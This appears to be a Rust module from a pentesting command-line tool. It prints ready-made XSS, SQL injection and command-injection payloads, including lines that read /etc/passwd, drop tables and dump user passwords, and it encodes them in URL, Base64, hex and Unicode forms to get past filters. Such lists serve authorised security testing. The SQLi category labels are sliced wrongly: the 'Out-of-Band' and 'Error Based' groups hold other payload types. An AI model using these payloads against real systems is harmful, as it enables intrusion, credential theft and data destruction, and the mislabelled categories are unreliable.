use colored::Colorize;
use base64::{Engine as _, engine::general_purpose};

const XSS_PAYLOADS: &[&str] = &[
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<img/src=x onerror=alert(1)>",
    "<<script>alert(1)//<</script>",
    "<svg><animate onbegin=alert(1) attributeName=x>",
    "<a href=javascript:alert(1)>click</a>",
    "<form><button formaction=javascript:alert(1)>X</button></form>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
];

const SQLI_PAYLOADS: &[&str] = &[
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "admin'--",
    "admin'#",
    "' UNION SELECT NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT user,password FROM users--",
    "'; DROP TABLE users--",
    "' AND SLEEP(5)--",
    "' AND BENCHMARK(5000000,MD5(1))--",
    "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "\" OR \"1\"=\"1",
    "\" OR 1=1 --",
    "' OR EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "' OR UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT(user(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1",
];

const CMDI_PAYLOADS: &[&str] = &[
    ";id",
    "|id",
    "&&id",
    "||id",
    ";id;",
    "$(id)",
    "`id`",
    ";cat /etc/passwd",
    "|cat /etc/passwd",
    "&&cat /etc/passwd",
    "$(cat /etc/passwd)",
    "`cat /etc/passwd`",
    ";whoami",
    "|whoami",
    "&&whoami",
    "$(whoami)",
    "`whoami`",
    ";nslookup test.example.com",
    "|nslookup test.example.com",
    "& powershell -c \"whoami\"",
];

pub async fn xss(_context: &str) -> anyhow::Result<()> {
    println!("{} XSS Payload Generator", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} {} payloads", "[*]".cyan().bold(), XSS_PAYLOADS.len());
    println!("{}", "-".repeat(60).dimmed());

    for (i, p) in XSS_PAYLOADS.iter().enumerate() {
        println!("  {} [{:02}] {}", "*".cyan(), i + 1, p);
    }

    println!("\n{} Encoded variants:", "[*]".cyan().bold());
    let test = XSS_PAYLOADS[0];
    println!("  {} URL:      {}", "*".cyan(), url_encode(test));
    println!("  {} Base64:   {}", "*".cyan(), general_purpose::STANDARD.encode(test));
    println!("  {} Hex:      {}", "*".cyan(), hex_encode(test));
    println!("  {} Unicode:  {}", "*".cyan(), unicode_encode(test));
    println!("  {} Double:   {}", "*".cyan(), url_encode(&url_encode(test)));
    println!("  {} HTML:     {}", "*".cyan(), html_encode(test));
    Ok(())
}

pub async fn sqli(_context: &str) -> anyhow::Result<()> {
    println!("{} SQLi Payload Generator", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} {} payloads", "[*]".cyan().bold(), SQLI_PAYLOADS.len());
    println!("{}", "-".repeat(60).dimmed());

    let categories = [
        ("Authentication Bypass", &SQLI_PAYLOADS[0..6] as &[&str]),
        ("UNION Based", &SQLI_PAYLOADS[6..10]),
        ("Error Based", &SQLI_PAYLOADS[16..18]),
        ("Time Based", &SQLI_PAYLOADS[11..15]),
        ("Stacked Queries", &SQLI_PAYLOADS[10..11]),
        ("Out-of-Band", &SQLI_PAYLOADS[18..20]),
    ];

    for (cat, payloads) in &categories {
        println!("\n  {} {} ({}):", "*".green().bold(), cat, payloads.len());
        for (i, p) in payloads.iter().enumerate() {
            println!("    {} [{:02}] {}", ">".cyan(), i + 1, p);
        }
    }

    println!("\n{} Encoded variants of '{}':", "[*]".cyan().bold(), SQLI_PAYLOADS[0]);
    println!("  {} URL:    {}", "*".cyan(), url_encode(SQLI_PAYLOADS[0]));
    println!("  {} Base64: {}", "*".cyan(), general_purpose::STANDARD.encode(SQLI_PAYLOADS[0]));
    println!("  {} Hex:    {}", "*".cyan(), hex_encode(SQLI_PAYLOADS[0]));
    Ok(())
}

pub async fn cmdi(_context: &str) -> anyhow::Result<()> {
    println!("{} Command Injection Payload Generator", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} {} payloads", "[*]".cyan().bold(), CMDI_PAYLOADS.len());
    println!("{}", "-".repeat(60).dimmed());

    let separators = [";", "|", "&&", "||", "$()", "``"];
    let commands = ["id", "whoami", "cat /etc/passwd", "ls -la", "uname -a", "ifconfig", "curl http://test.example.com"];

    println!("{} Separator matrix:", "[*]".cyan().bold());
    for sep in &separators {
        print!("  {} {:6} → ", "*".cyan(), sep);
        for cmd in &commands {
            let payload = match *sep {
                "$()" => format!("$({})", cmd),
                "``" => format!("`{}`", cmd),
                _ => format!("{}{}", sep, cmd),
            };
            print!("{} ", payload);
        }
        println!();
    }

    println!("\n{} All payloads:", "[*]".cyan().bold());
    for (i, p) in CMDI_PAYLOADS.iter().enumerate() {
        println!("  {} [{:02}] {}", "*".cyan(), i + 1, p);
    }

    println!("\n{} Encoded variants:", "[*]".cyan().bold());
    let test = CMDI_PAYLOADS[0];
    println!("  {} URL:      {}", "*".cyan(), url_encode(test));
    println!("  {} Base64:   {}", "*".cyan(), general_purpose::STANDARD.encode(test));
    println!("  {} Hex:      {}", "*".cyan(), hex_encode(test));
    println!("  {} Unicode:  {}", "*".cyan(), unicode_encode(test));
    Ok(())
}

pub async fn encode(input: &str, enc_type: &str) -> anyhow::Result<()> {
    println!("{} Payload Encoder", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Input: {}", "[*]".cyan().bold(), input);
    println!("{} Type:  {}", "[*]".cyan().bold(), enc_type);
    println!("{}", "-".repeat(60).dimmed());

    match enc_type {
        "all" | "ALL" => {
            println!("  {} URL:       {}", "*".cyan(), url_encode(input));
            println!("  {} URL (double): {}", "*".cyan(), url_encode(&url_encode(input)));
            println!("  {} Base64:    {}", "*".cyan(), general_purpose::STANDARD.encode(input));
            println!("  {} Base64 (URL-safe): {}", "*".cyan(), general_purpose::URL_SAFE.encode(input));
            println!("  {} Hex:       {}", "*".cyan(), hex_encode(input));
            println!("  {} Unicode:   {}", "*".cyan(), unicode_encode(input));
            println!("  {} HTML:      {}", "*".cyan(), html_encode(input));
            println!("  {} HTML (decimal): {}", "*".cyan(), html_decimal_encode(input));
        }
        "url" | "URL" => println!("  {} {}", "*".cyan(), url_encode(input)),
        "base64" | "BASE64" => println!("  {} {}", "*".cyan(), general_purpose::STANDARD.encode(input)),
        "hex" | "HEX" => println!("  {} {}", "*".cyan(), hex_encode(input)),
        "unicode" | "UNICODE" => println!("  {} {}", "*".cyan(), unicode_encode(input)),
        "html" | "HTML" => println!("  {} {}", "*".cyan(), html_encode(input)),
        _ => println!("{} Unknown encoding type: {}", "[-]".red().bold(), enc_type),
    }
    Ok(())
}

fn url_encode(s: &str) -> String {
    let mut result = String::new();
    for c in s.chars() {
        if c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '.' || c == '~' {
            result.push(c);
        } else {
            for byte in c.to_string().bytes() {
                result.push_str(&format!("%{:02X}", byte));
            }
        }
    }
    result
}

fn hex_encode(s: &str) -> String {
    s.bytes().map(|b| format!("{:02x}", b)).collect::<Vec<_>>().join("")
}

fn unicode_encode(s: &str) -> String {
    s.chars().map(|c| format!("\\u{:04x}", c as u32)).collect::<Vec<_>>().join("")
}

fn html_encode(s: &str) -> String {
    s.chars().map(|c| match c {
        '<' => "&lt;".to_string(),
        '>' => "&gt;".to_string(),
        '"' => "&quot;".to_string(),
        '\'' => "&#x27;".to_string(),
        '&' => "&amp;".to_string(),
        _ => c.to_string(),
    }).collect()
}

fn html_decimal_encode(s: &str) -> String {
    s.chars().map(|c| format!("&#{};", c as u32)).collect::<Vec<_>>().join("")
}
